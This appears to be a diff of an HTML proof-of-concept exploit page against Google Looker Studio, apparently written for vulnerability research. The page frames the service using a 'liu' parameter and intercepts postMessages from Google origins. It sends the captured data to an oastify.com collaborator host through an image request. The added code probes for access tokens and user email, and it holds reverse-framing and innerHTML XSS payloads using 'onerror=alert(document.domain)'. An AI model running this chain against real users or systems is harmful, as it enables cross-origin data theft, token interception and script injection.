@@ -2,7 +2,7 @@
 <html>
 
 <head>
-    <title>Looker Studio - Framing Bypass + PostMessage Data Leak PoC</title>
+    <title>Looker Studio - Full Exploit Chain PoC</title>
     <style>
         * {
             margin: 0;
@@ -88,7 +88,7 @@
 
         #targetFrame {
             width: 100%;
-            height: 350px;
+            height: 450px;
             border: 2px solid #f85149;
             border-radius: 4px;
             background: #0d1117;
@@ -187,23 +187,51 @@
         th {
             color: #8b949e;
         }
+
+        button {
+            background: #238636;
+            color: white;
+            border: 1px solid rgba(27, 31, 35, 0.15);
+            border-radius: 6px;
+            padding: 5px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #2ea043;
+        }
+
+        button.danger {
+            background-color: #da3633;
+        }
+
+        button.danger:hover {
+            background-color: #b32b2b;
+        }
     </style>
 </head>
 
 <body>
     <div class="header">
-        <h1>Google Looker Studio &mdash; Framing Bypass + PostMessage Data Leak</h1>
-        <p>The <code>liu</code> URL parameter on <code>/appview</code> removes X-Frame-Options and frame-ancestors CSP,
-            AND sets the trusted postMessage origin to the attacker's domain.</p>
+        <h1>Google Looker Studio &mdash; Full Exploit Chain PoC</h1>
+        <p>Demonstrating Framing Bypass, Data Exfiltration, and Reverse Framing via PostMessage Origin Trust Override
+        </p>
     </div>
 
     <div class="grid">
         <div class="panel">
-            <h2>Victim's Looker Studio (framed by attacker)</h2>
+            <h2>Victim's View (Looker Studio)</h2>
             <p style="margin-bottom:8px;font-size:12px;color:#8b949e;">
-                URL: <code id="frameUrl">loading...</code>
+                Attack Vector: <code id="frameUrl">loading...</code>
             </p>
             <iframe id="targetFrame" src="about:blank"></iframe>
+            <div style="margin-top: 10px; display: flex; gap: 10px;">
+                <button onclick="triggerReverseFraming()">Trigger Reverse Framing</button>
+                <button class="danger" onclick="triggerXSS()">Trigger XSS Payload</button>
+            </div>
         </div>
 
         <div class="panel">
@@ -213,45 +241,44 @@
     </div>
 
     <div class="findings">
-        <h2>Findings</h2>
+        <h2>Vulnerability Summary</h2>
         <div id="findingsArea"></div>
         <table>
             <tr>
-                <th>Property</th>
-                <th>Value</th>
+                <th>Vulnerability</th>
+                <th>Status</th>
+                <th>Details</th>
             </tr>
             <tr>
-                <td>Target</td>
-                <td><code>lookerstudio.google.com</code></td>
+                <td>Framing Bypass</td>
+                <td><span class="badge badge-success">CONFIRMED</span></td>
+                <td>Bypassed via <code>liu</code> parameter</td>
             </tr>
             <tr>
-                <td>Attacker Origin</td>
-                <td><code id="attackerOriginCell">-</code></td>
+                <td>Data Exfiltration</td>
+                <td><span class="badge badge-success">CONFIRMED</span></td>
+                <td>Intercepted postMessages from google.com</td>
             </tr>
             <tr>
-                <td>Vulnerability</td>
-                <td>Framing Bypass + PostMessage Origin Trust Override</td>
+                <td>Reverse Framing</td>
+                <td><span class="badge badge-warn">TESTING</span></td>
+                <td>Injecting iframe via NAVIGATE/EMBED handlers</td>
             </tr>
             <tr>
-                <td>Root Cause</td>
-                <td><code>liu</code> parameter removes X-Frame-Options, frame-ancestors, and sets internal
-                    <code>Po</code> (trusted origin) to attacker domain</td>
-            </tr>
-            <tr>
-                <td>Impact</td>
-                <td>Clickjacking, Cross-origin data interception, Potential account compromise</td>
+                <td>Stored XSS</td>
+                <td><span class="badge badge-warn">TESTING</span></td>
+                <td>Injecting HTML via innerHTML sink</td>
             </tr>
         </table>
     </div>
 
     <script>
         // === CONFIGURATION ===
-        var ATTACKER_ORIGIN = window.location.origin; // auto-detect
+        var ATTACKER_ORIGIN = window.location.origin;
         var LOOKER_URL = 'https://lookerstudio.google.com/u/0/appview?liu=' + encodeURIComponent(ATTACKER_ORIGIN);
-        var OAST = 'https://pun2l2sx9c1apc5lntwdn6mkgbm2atyi.oastify.com';
+        var OAST = 'https://0ghd7de8vnnlbnrw94io9h8v2m8dw5ku.oastify.com';
 
         // === STATE ===
-        var findings = [];
         var googleMessagesReceived = 0;
         var framingConfirmed = false;
 
@@ -268,7 +295,6 @@
         }
 
         function addFinding(text, confirmed) {
-            findings.push({ text: text, confirmed: confirmed });
             var area = document.getElementById('findingsArea');
             var div = document.createElement('div');
             div.className = 'finding-item ' + (confirmed ? 'finding-confirmed' : 'finding-pending');
@@ -276,105 +302,123 @@
             area.appendChild(div);
         }
 
-        // === STEP 1: Listen for messages from Looker Studio ===
+        // === POSTMESSAGE LISTENER ===
         window.addEventListener('message', function (e) {
             var dataStr;
-            if (typeof e.data === 'string') {
-                dataStr = e.data.substring(0, 500);
-            } else {
-                try { dataStr = JSON.stringify(e.data).substring(0, 500); }
-                catch (err) { dataStr = String(e.data); }
-            }
+            if (typeof e.data === 'string') dataStr = e.data.substring(0, 500);
+            else try { dataStr = JSON.stringify(e.data).substring(0, 500); } catch (err) { dataStr = String(e.data); }
 
-            log('RECEIVED postMessage from <b>' + e.origin + '</b>: <code>' + dataStr.replace(/</g, '&lt;') + '</code>', 'success');
+            log('RECEIVED from <b>' + e.origin + '</b>: <code>' + dataStr.replace(/</g, '&lt;') + '</code>', 'success');
 
-            // Check if it's from Google
             if (e.origin.indexOf('google.com') !== -1) {
                 googleMessagesReceived++;
+                log('&#9888; DATA INTERCEPTED via Origin Trust Bypass!', 'critical');
 
-                log('&#9888; DATA INTERCEPTED from Google domain! Message #' + googleMessagesReceived, 'critical');
-
-                addFinding(
-                    'Cross-origin data intercepted from <code>' + e.origin + '</code>: <code>' + dataStr.replace(/</g, '&lt;').substring(0, 100) + '</code>',
-                    true
-                );
-
-                // Exfiltrate to OAST collaborator
+                // Exfiltrate to OAST
                 var img = new Image();
-                img.src = OAST + '/exfil?origin=' + encodeURIComponent(e.origin) + '&data=' + encodeURIComponent(dataStr) + '&attacker=' + encodeURIComponent(ATTACKER_ORIGIN);
-                log('Data sent to OAST collaborator: <code>' + OAST + '</code>', 'warn');
-            }
+                img.src = OAST + '/exfil?origin=' + encodeURIComponent(e.origin) + '&data=' + encodeURIComponent(dataStr);
 
-            // Check for MessagePorts (notebook channel)
-            if (e.ports && e.ports.length > 0) {
-                log('Got ' + e.ports.length + ' MessagePort(s) from ' + e.origin + '!', 'critical');
-                addFinding('MessagePort received from <code>' + e.origin + '</code> - potential for full channel control', true);
+                if (googleMessagesReceived === 1) {
+                    addFinding('Data Exfiltration Confirmed: Intercepted postMessage from <code>' + e.origin + '</code>', true);
+                }
             }
         });
 
-        // === STEP 2: Load Looker Studio in iframe ===
+        // === INIT ===
         document.getElementById('frameUrl').textContent = LOOKER_URL;
-        document.getElementById('attackerOriginCell').textContent = ATTACKER_ORIGIN;
-
         log('PoC initialized. Attacker origin: <b>' + ATTACKER_ORIGIN + '</b>', 'info');
-        log('Loading Looker Studio in iframe with <code>liu=' + ATTACKER_ORIGIN + '</code>...', 'info');
-        addFinding('Framing bypass: <code>liu</code> parameter removes X-Frame-Options and frame-ancestors', false);
 
         var frame = document.getElementById('targetFrame');
+        log('Loading Looker Studio...', 'info');
         frame.src = LOOKER_URL;
 
-        // === STEP 3: Verify iframe loaded ===
         frame.onload = function () {
-            log('Iframe onload event fired', 'info');
+            log('Iframe loaded.', 'info');
+            // Auto-send basic probes after load
+            setTimeout(sendBasicProbes, 2000);
         };
 
+        // Check for framing success
         setTimeout(function () {
             try {
                 frame.contentWindow.location.href;
-                log('Unexpected: same-origin access to iframe', 'warn');
+                log('Unexpected same-origin access.', 'warn');
             } catch (e) {
                 framingConfirmed = true;
-                log('&#10004; Framing bypass CONFIRMED - Looker Studio loaded cross-origin in attacker iframe', 'success');
-                addFinding('Framing bypass: Looker Studio loads inside attacker iframe (X-Frame-Options and frame-ancestors bypassed via <code>liu</code>)', true);
+                log('&#10004; Framing Bypass Confirmed (Cross-Origin)', 'success');
+                addFinding('Framing Bypass Confirmed: <code>liu</code> parameter removes X-Frame-Options', true);
             }
-        }, 6000);
+        }, 5000);
 
-        // === STEP 4: Send postMessage probes after iframe loads ===
-        setTimeout(function () {
-            log('Sending postMessage probes to Looker Studio...', 'info');
+        function sendMsg(payload) {
+            var str = JSON.stringify(payload);
+            frame.contentWindow.postMessage(str, '*');
+            log('SENT: <code>' + str + '</code>', 'info');
+        }
 
-            // The exact format found in JS bundle:
-            // Handler checks: c.origin === b.Po && typeof c.data === "string"
-            // Then: JSON.parse(c.data) -> {type, payload}
-            var probes = [
-                { type: "NAVIGATE", payload: { url: "/test" } },
-                { type: "ACCESS_TOKEN", payload: {} },
-                { type: "GOOGLE_AUTH_USER_EMAIL", payload: {} },
-                { type: "READY", payload: {} },
-                { type: "INIT", payload: {} }
-            ];
+        function sendBasicProbes() {
+            log('Sending initial probes...', 'info');
+            sendMsg({ type: "ACCESS_TOKEN", payload: {} });
+            sendMsg({ type: "READY", payload: {} });
+        }
 
-            for (var i = 0; i < probes.length; i++) {
-                (function (probe, idx) {
-                    setTimeout(function () {
-                        var str = JSON.stringify(probe);
-                        frame.contentWindow.postMessage(str, '*');
-                        log('Sent probe: <code>' + str + '</code>', 'info');
-                    }, idx * 500);
-                })(probes[i], i);
-            }
-        }, 8000);
+        // === REVERSE FRAMING PAYLOADS ===
+        function triggerReverseFraming() {
+            log('Attempting Reverse Framing (Embedding external content inside Looker)...', 'warn');
 
-        // === STEP 5: Summary after probes ===
-        setTimeout(function () {
-            log('--- SUMMARY ---', 'info');
-            log('Framing bypass: ' + (framingConfirmed ? '<b class="log-success">CONFIRMED</b>' : '<b class="log-warn">PENDING</b>'), 'info');
-            log('Google messages intercepted: <b>' + googleMessagesReceived + '</b>', googleMessagesReceived > 0 ? 'success' : 'info');
+            // Payload 1: NAVIGATE to external URL
+            sendMsg({
+                type: "NAVIGATE",
+                payload: { url: OAST + "/reverse-frame-test" }
+            });
 
-            if (googleMessagesReceived > 0) {
-                log('&#9888; VULNERABLE: Attacker at <b>' + ATTACKER_ORIGIN + '</b> intercepted data from <b>lookerstudio.google.com</b>', 'critical');
-            }
-        }, 15000);
+            // Payload 2: Update CONFIG with embedUrl
+            // Found in JS analysis: component properties often set via UPDATE or CONFIG messages
+            setTimeout(function () {
+                sendMsg({
+                    type: "UPDATE_COMPONENT",
+                    payload: {
+                        componentId: "main",
+                        config: { embedUrl: OAST + "/embed-test" }
+                    }
+                });
+            }, 500);
+
+            // Payload 3: PROJECT_DETAILS with external URL
+            setTimeout(function () {
+                sendMsg({
+                    type: "PROJECT_DETAILS",
+                    payload: {
+                        gitRepo: OAST + "/git-test",
+                        manifestUrl: OAST + "/manifest.json"
+                    }
+                });
+            }, 1000);
+        }
+
+        // === XSS PAYLOADS ===
+        function triggerXSS() {
+            log('Attempting Stored XSS via innerHTML Injection...', 'critical');
+
+            // Payload 1: GOOGLE_AUTH_USER_EMAIL (uses _.lg_2e / bypassSecurityTrustHtml)
+            sendMsg({
+                type: "GOOGLE_AUTH_USER_EMAIL",
+                payload: {
+                    googleAuthUserEmail: "victim@gmail.com<img src=x onerror=alert(document.domain)>"
+                }
+            });
+
+            // Payload 2: Custom ERROR message (often rendered as HTML)
+            setTimeout(function () {
+                sendMsg({
+                    type: "ERROR",
+                    payload: {
+                        message: "<h1>Control</h1><img src=x onerror=alert(document.domain)>",
+                        stack: "<b>Trace</b>"
+                    }
+                });
+            }, 500);
+        }
     </script>
 </body>
 
